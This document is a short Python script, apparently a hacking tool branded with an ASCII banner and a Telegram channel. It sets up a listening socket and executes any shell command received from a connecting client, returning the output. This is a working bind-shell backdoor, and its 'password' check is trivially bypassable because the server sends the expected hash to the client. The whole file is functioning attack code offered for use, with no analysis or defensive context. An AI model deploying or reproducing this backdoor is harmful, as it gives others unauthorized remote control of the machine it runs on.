import socket
import subprocess
import os
import hashlib

COLORS = {
    "red": "\033[91m",
    "green": "\033[92m",
    "yellow": "\033[93m",
    "blue": "\033[94m",
    "purple": "\033[95m",
    "cyan": "\033[96m",
    "white": "\033[97m",
    "reset": "\033[0m"
}

BANNER = """
    ┈┈┈╲┈┈┈┈╱
    ┈┈┈╱▔▔▔▔╲
    ┈┈┃┈▇┈┈▇┈┃
    ╭╮┣━━━━━━┫╭╮
    ┃┃┃┈┈┈┈┈┈┃┃┃
    ╰╯┃┈┈┈┈┈┈┃╰╯
    ┈┈╰┓┏━━┓┏╯
    ┈┈┈╰╯┈┈╰╯
    __        
    \\  / | |__/ | |\\ | / _`       
     \\/  | |  \\ | | \\| \\__>
     
powered by t.me/VikingTERMINAL
"""

def print_color(text, color):
    if color in COLORS:
        return f"{COLORS[color]}{text}{COLORS['reset']}"
    else:
        return text

def execute_command(command):
    try:
        if command.startswith('cd'):
            os.chdir(command[3:].strip())  
            return ""
        
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = process.stdout.read() + process.stderr.read()
        output_str = output_bytes.decode("utf-8")
        return output_str
    except Exception as e:
        return str(e)

def authenticate(client_socket):
    password_hash = hashlib.sha256(b"password").hexdigest()  
    client_socket.sendall(password_hash.encode("utf-8"))
    client_input_hash = client_socket.recv(1024).decode("utf-8")
    if client_input_hash == password_hash:
        return True
    else:
        return False

def main():
    try:
        print(print_color(BANNER, "green"))
        
        lhost = input(print_color("Enter the IP address of your server: ", "cyan"))
        lport = int(input(print_color("Enter the port of your server: ", "cyan")))
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        server_socket.bind((lhost, lport))
        server_socket.listen(5)  
        
        print(print_color(f"[+] Server listening on {lhost}:{lport}", "green"))
        
        while True:
            client_socket, addr = server_socket.accept()
            print(print_color(f"[+] Connection established with {addr[0]}:{addr[1]}", "green"))
            
            authenticated = authenticate(client_socket)
            if not authenticated:
                print(print_color("[-] Unauthorized access.", "red"))
                client_socket.close()
                continue
            
            while True:
                command = client_socket.recv(1024).decode("utf-8")
                if not command:
                    break  
                output = execute_command(command)
                client_socket.sendall(output.encode("utf-8"))
            
            client_socket.close()
    except Exception as e:
        print(print_color(f"[-] An error occurred: {e}", "red"))
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()
